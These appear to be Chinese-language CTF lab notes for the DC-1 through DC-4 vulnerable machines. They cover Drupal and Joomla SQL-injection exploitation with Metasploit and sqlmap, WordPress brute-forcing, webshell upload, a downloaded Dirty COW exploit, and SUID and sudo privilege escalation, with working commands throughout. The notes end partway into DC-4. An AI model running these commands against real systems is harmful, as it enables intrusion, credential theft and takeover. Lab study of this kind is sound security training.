# DC-1
打开靶机

**信息收集**

**扫描网段**

`netdiscover`找到靶机ip地址

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772706716469-40216c49-2545-45f5-a200-b3301ac0f309.png)

**扫描端口**

`nmap 192.168.43.43`	更详细的端口扫描`nmap -sV -sC -p- 192.168.43.43`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772706902232-650479ac-faa5-48d7-9765-3113b54e39b3.png)

**目录扫描**

`dirb [http://192.168.43.43/](http://192.168.43.43/)`

    - <font style="color:rgb(15, 17, 21);">核心Drupal目录: /includes/, /modules/, /themes/, /profiles/, /scripts/, /sites/</font>
    - <font style="color:rgb(15, 17, 21);">敏感文件: /README, /LICENSE, /robots.txt, /web.config</font>
    - <font style="color:rgb(15, 17, 21);">登录入口: /user (200)</font>
    - <font style="color:rgb(15, 17, 21);">内容页面: /node (200)</font>
    - <font style="color:rgb(15, 17, 21);">管理后台: /admin (403, 存在但无权限)</font>
    - <font style="color:rgb(15, 17, 21);">其他403路径: /search, /batch, /cgi-bin/, /server-status</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772708406176-80b6915d-0e0e-4c26-84e9-8a0458c83ba5.png)

**漏洞扫描和挖掘**

`nmap --script=vuln -p80 192.168.43.43 --stats-every=5s`

+ <font style="color:rgb(15, 17, 21);">核心漏洞发现</font><font style="color:rgb(15, 17, 21);">:</font>
    - <font style="color:rgb(15, 17, 21);">CVE-2014-3704 (Drupalgeddon)</font>
        * <font style="color:rgb(15, 17, 21);">漏洞类型: 预认证SQL注入</font>
        * <font style="color:rgb(15, 17, 21);">状态: 可利用</font>
        * <font style="color:rgb(15, 17, 21);">影响版本: Drupal 7.x before 7.32</font>
        * <font style="color:rgb(15, 17, 21);">披露日期: 2014-10-15</font>
+ <font style="color:rgb(15, 17, 21);">CSRF漏洞发现</font><font style="color:rgb(15, 17, 21);">:</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 用户登录表单</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/node?destination=node</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 用户登录表单</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user/password</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 密码重置表单</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user/register</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 用户注册表单</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 用户登录表单</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 用户登录表单</font>
+ <font style="color:rgb(15, 17, 21);">信息泄露发现</font><font style="color:rgb(15, 17, 21);">:</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/rss.xml</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- RSS订阅源</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/robots.txt</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 爬虫协议</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/UPGRADE.txt</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 升级说明</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/INSTALL.txt</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 安装说明</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/INSTALL.mysql.txt</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- MySQL安装说明</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/INSTALL.pgsql.txt</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- PostgreSQL安装说明</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/README</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 说明文件</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/README.txt</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 说明文件</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/0/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 潜在敏感目录</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/user/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 用户目录</font>
+ <font style="color:rgb(15, 17, 21);">版本确认</font><font style="color:rgb(15, 17, 21);">: Drupal 7</font>
+ <font style="color:rgb(15, 17, 21);">下一步攻击点: 利用CVE-2014-3704 SQL注入漏洞获取Webshell</font>

```plain
用户提交: name[0; DROP TABLE users; --]=admin

处理过程:
1. $nested_key = "0; DROP TABLE users; --"
2. 生成新键名: name_0; DROP TABLE users; --
3. 最终SQL: WHERE name IN (:name_0; DROP TABLE users; --)
4. SQL执行时变成两条语句！
```

**漏洞利用**** **

**M1:msf**

```bash
#打开msf
msfconsole

#搜索drupal
search drupal
use 0
show otions  //查看参数
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772773789264-96f1ec23-effe-4f84-8b31-1ad741b82c24.png)

设置必要参数

```bash
# 1. 设置目标IP
msf6 exploit(multi/http/drupal_drupageddon) > set RHOSTS 192.168.43.43
RHOSTS => 192.168.43.43

# 2. 设置本机IP (你的Kali IP)
msf6 exploit(multi/http/drupal_drupageddon) > set LHOST 192.168.43.xxx
# 注意: xxx 改成你Kali的实际IP！用ifconfig查看

# 3. 设置目标路径
msf6 exploit(multi/http/drupal_drupageddon) > set TARGETURI /
TARGETURI => /

# 4. 查看设置结果
msf6 exploit(multi/http/drupal_drupageddon) > show options
```

检查漏洞是否存在`check`

开始`run`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772793643822-46a88fe5-69b4-462c-8168-90453cb9728c.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772793674049-29189939-4528-4a7a-96ee-442749fc609f.png)

```bash
# 你用的是 php/meterpreter
# 因为：
漏洞是PHP应用
通过Web入口进入
功能受限

#用系统shell

```



**M2:手动注入**

**提权**

**信息收集**

**找到bash权限的用户 flag4,root**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772794484217-60ce2b75-2b74-48d5-b172-d895c00d9cca.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772794534840-b34b87ab-0658-4b65-8814-3435c70a3386.png)

查看flag4家目录`ls -la /home/flag4/`

找到flag文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772795096987-6522d98e-bef1-4010-8a7b-e6ad7ed97220.png)

查看文件`cat /home/flag4/* 2>/dev/null`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772795198009-1137ef4b-6f9d-4e0d-869e-4fdec0fc0c83.png)

-->切换到flag4-->切换到root

**权限提升**

**需要切换flag4=>m1:找密码 m2:suid直接提权为root m3:修改.etc/passwd**

**m1**

```bash
# 1. 查看配置文件找密码
cat /var/www/html/sites/default/settings.php

# 2. 查看flag4的命令历史
cat /home/flag4/.bash_history

# 3. 查看数据库（如果知道MySQL密码）
mysql -u root -p
show databases;
use drupal;
select * from users;
```

=>没有权限没有文件

m2

`find / -perm -4000 -type f 2>/dev/null`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772797073912-c4aa3941-94ef-48e2-b6dc-4d7cfe245c86.png)

=>**<font style="color:rgb(15, 17, 21);">用有root权限的find程序，在当前目录随便找个文件，然后用root身份启动一个shell</font>**

`/usr/bin/find . -exec /bin/sh \; -quit`

```bash
whoami
root

cd /root
ls -la
  drwx------  4 root root 4096 Feb 28  2019 .
  drwxr-xr-x 23 root root 4096 Feb 19  2019 ..
  drwx------  2 root root 4096 Feb 19  2019 .aptitude
  -rw-------  1 root root   44 Feb 28  2019 .bash_history
  -rw-r--r--  1 root root  949 Feb 19  2019 .bashrc
  drwxr-xr-x  3 root root 4096 Feb 19  2019 .drush
  -rw-r--r--  1 root root  140 Nov 20  2007 .profile
  -rw-r--r--  1 root root  173 Feb 19  2019 thefinalflag.txt=>最终flag

cat thefinalflag.txt
  Well done!!!!

  Hopefully you've enjoyed this and learned some new skills.
  
  You can let me know what you thought of this little journey
  by contacting me via Twitter - @DCAU7

```

# DC2
netdiscover 扫描到靶机

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772948091610-f3ee095a-5b2b-4501-a4c6-931cd83f0ca0.png)

**信息收集**

**端口扫描**

`nmap 192.168.43.44`

开启了80端口  
 <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772948197310-7c411686-13a3-4734-948e-e85492b277e0.png)

**目录扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1772949367948-82b9b68f-5b75-4ae2-9758-7d1426a54d1f.png)

<font style="color:rgb(15, 17, 21);">⚠️</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">高危：目录列表开启</font>**

<font style="color:rgb(15, 17, 21);">多个目录（</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/wp-content/</font>`<font style="color:rgb(15, 17, 21);">、</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/wp-includes/</font>`<font style="color:rgb(15, 17, 21);">等）允许</font>**<font style="color:rgb(15, 17, 21);">目录浏览</font>**<font style="color:rgb(15, 17, 21);">，攻击者可：</font>

<font style="color:rgb(15, 17, 21);">查看敏感文件</font>

<font style="color:rgb(15, 17, 21);">发现备份文件</font>

<font style="color:rgb(15, 17, 21);">找到版本信息</font>

<font style="color:rgb(15, 17, 21);">⚠️</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">WordPress版本泄露</font>**

<font style="color:rgb(15, 17, 21);">通过访问可列目录，可能找到版本号：</font>

<font style="color:rgb(15, 17, 21);">/wp-includes/ 中通常有 version.php</font>

<font style="color:rgb(15, 17, 21);">⚠️</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">攻击面</font>**

**<font style="color:rgb(15, 17, 21);">/wp-admin/</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 登录爆破</font>

**<font style="color:rgb(15, 17, 21);">/xmlrpc.php</font>**<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- WordPress API爆破（更快）</font>

**<font style="color:rgb(15, 17, 21);">插件/主题漏洞</font>**<font style="color:rgb(15, 17, 21);"> - 检查 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/wp-content/plugins/</font>`<font style="color:rgb(15, 17, 21);"> 中的插件</font>

**<font style="color:rgb(15, 17, 21);">漏洞扫描挖掘利用</font>**

**flag1**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1773046480044-17d83e79-a8d6-4d57-998e-4c276bb6a4b4.png)

**flag2**

=>需要用cewl生成字典=>需要登录=>登不上换一个

```bash
#生成字典
cewl http://dc-2 -w passwords.txt

#爆破:对所有用户爆破测试
wpscan --url http://dc-2 \
  -U admin,jerry,tom \
  -P passwords.txt \
  --password-attack xmlrpc
```

拿到两个用户名密码

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1773047681631-736bdae1-9a0e-4c63-99d7-602fa7215a89.png)

找到登录界面登录两个账号找到****

[http://dc-2/wp-admin/](http://dc-2/wp-admin/)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1773051926046-58c6e39d-28ba-4b5d-9959-022dc1ba4f3e.png)

寻找另一条入口点

**flag3**

`nmap -p- 192.168.43.44`

检测到端口7744,<font style="color:rgb(15, 17, 21);">7744 = SSH 是 DC-2 的经典设计</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1773053718668-f61c9bc7-2b32-4d94-8f80-9a17f5492646.png)

=>ssh登录 

检测服务版本`nmap -p7744 -sV 192.168.43.44`

ssh开放

<font style="color:rgb(15, 17, 21);"> </font><!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1773053925422-1c41f5d6-602c-4ebf-9fbd-6271d49203f5.png)

ssh登录`ssh tom@192.168.43.44 -p 7744` 密码parturient

```bash
tom@DC-2:~$ whoami
-rbash: whoami: command not found
tom@DC-2:~$ ls
flag3.txt  usr
tom@DC-2:~$ cat flag3.txt
-rbash: cat: command not found
tom@DC-2:~$ vim flag3.txt
-rbash: vim: command not found
tom@DC-2:~$ less flag3.txt
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1773054700396-8d7d4f48-b82b-4fe7-88d7-c0c809fb9b7a.png)

**flag4**

```bash
#查早命令目录
tom@DC-2:~$ echo $PATH
/home/tom/usr/bin
#列出哪些命令可用
tom@DC-2:~$ ls -la /home/tom/usr/bin
total 8
drwxr-x--- 2 tom tom 4096 Mar 21  2019 .
drwxr-x--- 3 tom tom 4096 Mar 21  2019 ..
lrwxrwxrwx 1 tom tom   13 Mar 21  2019 less -> /usr/bin/less
lrwxrwxrwx 1 tom tom    7 Mar 21  2019 ls -> /bin/ls
lrwxrwxrwx 1 tom tom   12 Mar 21  2019 scp -> /usr/bin/scp
lrwxrwxrwx 1 tom tom   11 Mar 21  2019 vi -> /usr/bin/vi

#把bash设为设shell
tom@DC-2:~$ vi#进入vi
#输入	:set shell=/bin/bash
#     :shell

#恢复命令搜索路径
export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
#验证
tom@DC-2:~$ echo $PATH 
/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin

jerry@DC-2:/home/tom$ cd /home/jerry
jerry@DC-2:~$ ls
flag4.txt
jerry@DC-2:~$ cat flag4.txt
Good to see that you've made it this far - but you're not home yet. 

You still need to get the final flag (the only flag that really counts!!!).  

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!


```

flag5	

=>用git提权	

```bash
sudo -l#查看可以用哪些root权限

sudo git branch --help config
!bin/bash
```

`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">git help</font>`<font style="color:rgb(15, 17, 21);"> 默认会用 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">less</font>`<font style="color:rgb(15, 17, 21);"> 这个分页器来显示帮助文档。</font>  
<font style="color:rgb(15, 17, 21);">而 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">less</font>`<font style="color:rgb(15, 17, 21);"> 有一个功能：</font>**<font style="color:rgb(15, 17, 21);">可以在文档界面里执行外部命令</font>**<font style="color:rgb(15, 17, 21);">。</font>

# <font style="color:rgb(15, 17, 21);">DC-3.2</font>
**信息收集**

**浏览网页**

+ 主界面可能有sql注入

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774442252185-650b1fc6-a7d6-4e09-9411-7ad3c547d993.png)

+ 不同的页面get参数不一样,可能有文件包含漏洞

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774442365278-4e6a9771-d885-45c5-9eee-4ebd1cb2753d.png)<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774442368521-21e684af-8ec2-48a6-abe8-17ee85a1c46e.png)

+ 有admin用户,可能是爆破对象

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774442466018-b655bcd8-5b02-4660-8241-9e481908a4dd.png)

+ 看url路径是典型的<font style="color:rgb(15, 17, 21);">Joomla 路径格式,网站由joomla搭建,可用已知漏洞</font>
+ <font style="color:rgb(15, 17, 21);">访问joomla目录发现</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/administrator</font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">,可能存在弱口令,爆破,sql注入</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774442898489-a5dc58f0-502c-481f-bf4b-52870458031d.png)

**端口扫描**

`nmap -p- 192.168.43.47`

开放80端口

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774443151622-27257cbc-da90-4eb7-b62d-a79d87a7cee7.png)

**目录扫描**

1. **<font style="color:rgb(15, 17, 21);">目录列表开启</font>**<font style="color:rgb(15, 17, 21);">（可直接浏览）</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/administrator/components/</font>`
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/administrator/logs/</font>`
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/tmp/packages/</font>`
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/images/</font>`
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/plugins/*</font>`<font style="color:rgb(15, 17, 21);">（多个子目录）</font>
2. **<font style="color:rgb(15, 17, 21);">敏感目录暴露</font>**
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/tmp/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 临时文件目录</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/cache/</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">- 缓存目录</font>
    - `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">/bin/</font>`<font style="color:rgb(15, 17, 21);"> - 系统目录</font>

**技术栈识别**

访问[http://192.168.43.47/administrator/manifests/files/joomla.xml](http://192.168.43.47/administrator/manifests/files/joomla.xml)

关键发现joomla版本37.0;存在大量已知漏洞

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774578221601-cafed259-49e2-4377-a023-55fc05d21fbf.png)  
**漏洞利用**

**sql注入**

 Joomla 3.7.0 新增的 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">com_fields</font>` 组件，允许普通用户通过 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">view=fields&layout=modal</font>` 访问管理员后台逻辑；其 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">getListQuery</font>` 方法中，`<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">list[fullordering]</font>` 参数未做严格过滤，直接拼接到 SQL 的 `<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">ORDER BY</font>` 语句，导致 **<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">报错注入 + 写入文件 getshell</font>**。  

```plain
sqlmap -u "http://192.168.43.47/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  --dbms=mysql --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774579630793-5e644147-98af-4438-b543-2be1c2634eeb.png)

```plain
获得数据库joomladb
获取表明#_users
获取数据
  sqlmap -u "http://192.168.43.47/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" \
  -D joomladb \
  -T "#__users" \
  -C "id,username,password,email" \
  --dump \
  --delay=2 \
  --flush-session \
  --batch
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774585044519-a1936a97-179f-4415-84a6-510a5ef27394.png)

破解

```plain
# 保存hash
echo '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' > hash.txt

# 用john破解（kali自带）
john --format=bcrypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# 如果rockyou.txt未解压
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

密码snoopy

**getshell m1:metasploit**

用admin登录后台

```plain
msf6 > use exploit/unix/webapp/joomla_comfields_sqli_rce
msf6 > set RHOSTS 192.168.43.47
msf6 > set TARGETURI /administrator
msf6 > exploit
#进入meterpreter
>shell
#进入shell

ls /home
dc3
ls /home/dc3
ls /home/dc3 -la
total 28
drwxr-xr-x 3 dc3  dc3  4096 Mar 26  2019 .
drwxr-xr-x 3 root root 4096 Mar 23  2019 ..
-rw------- 1 dc3  dc3   203 Mar 26  2019 .bash_history
-rw-r--r-- 1 dc3  dc3   220 Mar 23  2019 .bash_logout
-rw-r--r-- 1 dc3  dc3  3771 Mar 23  2019 .bashrc
drwx------ 2 dc3  dc3  4096 Mar 23  2019 .cache
-rw-r--r-- 1 dc3  dc3   675 Mar 23  2019 .profile
-rw-r--r-- 1 dc3  dc3     0 Mar 23  2019 .sudo_as_admin_successful
```

+ <font style="color:rgb(15, 17, 21);">用户</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">dc3</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">有</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">.sudo_as_admin_successful</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">文件 →</font><font style="color:rgb(15, 17, 21);"> </font>**<font style="color:rgb(15, 17, 21);">有sudo权限</font>**
+ <font style="color:rgb(15, 17, 21);">目标：从 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">www-data</font>`<font style="color:rgb(15, 17, 21);"> 提权到 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">dc3</font>`<font style="color:rgb(15, 17, 21);">，再提权到 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">root</font>`

**getshell m2:手动**

**浏览网站**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774585453960-7cd1fb3e-c2c1-4910-bd07-be2775ea7e84.png)

[http://192.168.43.47/administrator/index.php?option=com_content&view=article&layout=edit](http://192.168.43.47/administrator/index.php?option=com_content&view=article&layout=edit)

-->写文章-->xss

[http://192.168.43.47/administrator/index.php?option=com_media](http://192.168.43.47/administrator/index.php?option=com_media)

-->上传文件-->文件上传漏洞

[http://192.168.43.47/administrator/index.php?option=com_users&view=users](http://192.168.43.47/administrator/index.php?option=com_users&view=users)

-->用户管理-->提权

beez3--> 登录后台后，上传webshell → 直接 getshell  

**改beez3模板的php文件**

<font style="color:rgb(0, 0, 0);background-color:rgba(255, 255, 255, 0.5);">extensions>templates>templates>new file</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774604661617-93239f88-55a6-481f-b079-42000688f5e5.png)

蚁剑连接[http://192.168.43.47/templates/beez3/shell.php](http://192.168.43.47/templates/beez3/shell.php)

**提权**

```plain
#升级到tty shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

cat /home/dc3/.bash_history
cat: /home/dc3/.bash_history: Permission denied
www-data@DC-3:/$ su dc3
su dc3
Password: 

su: Authentication failure
www-data@DC-3:/$ ls -la /home/dc3/
ls -la /home/dc3/
total 28
drwxr-xr-x 3 dc3  dc3  4096 Mar 26  2019 .
drwxr-xr-x 3 root root 4096 Mar 23  2019 ..
-rw------- 1 dc3  dc3   203 Mar 26  2019 .bash_history
-rw-r--r-- 1 dc3  dc3   220 Mar 23  2019 .bash_logout
-rw-r--r-- 1 dc3  dc3  3771 Mar 23  2019 .bashrc
drwx------ 2 dc3  dc3  4096 Mar 23  2019 .cache
-rw-r--r-- 1 dc3  dc3   675 Mar 23  2019 .profile
-rw-r--r-- 1 dc3  dc3     0 Mar 23  2019 .sudo_as_admin_successful
www-data@DC-3:/$ sudo -l
sudo -l
[sudo] password for www-data: 

```

+ `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">www-data</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">没有sudo权限</font>
+ `<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">dc3</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">有sudo权限，但不知道密码</font>
+ <font style="color:rgb(15, 17, 21);">无法读取 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">.bash_history</font>`<font style="color:rgb(15, 17, 21);">（权限拒绝）</font>

<font style="color:rgb(15, 17, 21);">    -->查找suid提权文件</font>`<font style="color:rgb(15, 17, 21);">find / -perm -4000 -type f 2>/dev/null</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774615727403-3f3f3c21-5547-49ed-848b-b47cd76c25cf.png)

<font style="color:rgb(15, 17, 21);">然后用各种提权文件都不行-->尝试已知漏洞</font>

**<font style="color:rgb(15, 17, 21);">内核漏洞提权</font>**

`<font style="color:rgb(15, 17, 21);">uname -a</font>`<font style="color:rgb(15, 17, 21);">已知漏洞CVE-2016-5195 Dirty Cow</font>

```plain
# 1. 进入可写目录
cd /tmp

# 2. 下载脏牛EXP（C++版本）
wget https://www.exploit-db.com/download/40847 -O dirtycow.c

# 3. 重命名为.cpp（因为这是C++代码）
mv dirtycow.c 40847.cpp

# 4. 用g++编译（注意参数）
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dirtycow 40847.cpp -lutil

# 5. 执行提权（-s 参数直接弹root shell）
./dirtycow -s

# 6. 如果成功，你会进入root shell
# 提示符变成 #
whoami
# 输出: root
```

拿到flag 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774671359096-6c1fbeac-f2aa-4300-ac09-2c147c94a6e4.png)



# DC-4
**信息收集**

**浏览网页**

管理员登录页

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774672822718-1baa312f-9fa8-45e3-b6d8-ef6f1d5e89c4.png)

-->弱口令

-->sql注入

-->爆破

**端口扫描**

`nmap -p- 192.168.43.50`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774672984126-a7b528c3-8bf7-4844-86e1-4f818b906955.png)

22端口开放-->ssh连接

**目录扫描**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774673141903-71d398fd-1616-4617-9dd5-2ed36ae672e7.png)

只有index.php登录页

**指纹识别**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774673230877-815a74cf-f932-4baa-9e54-6b50aebb3cc7.png)

-->自制网页,没有已知漏洞

**漏洞扫描**

`nmap -p80 --script=vuln 192.168.43.50`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774673565372-9bb7f1c1-9ba5-4b37-8bc6-ec008cc0b972.png)

没有高危漏洞 <font style="color:rgb(15, 17, 21);">存在 CSRF 风险</font>

**<font style="color:rgb(15, 17, 21);">漏洞挖掘</font>**

**<font style="color:rgb(15, 17, 21);">弱口令</font>**

<font style="color:rgb(15, 17, 21);">没尝试出来</font>

**<font style="color:rgb(15, 17, 21);">爆破</font>**

<font style="color:rgb(15, 17, 21);">密码是happy,登录</font>

**<font style="color:rgb(15, 17, 21);">浏览网站</font>**

<font style="color:rgb(15, 17, 21);">发现/command.php可以执行命令</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774697917267-548beccf-0264-45ac-9eab-05fa991184b3.png)

-->抓包

-->查看源码

**抓包**

run三个不同的命令抓包

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/47774866/1774698131756-3027aa86-e95b-4f9d-935a-4fee3bafe051.png)

<!-- 这是一张图片，ocr 内容为： -->
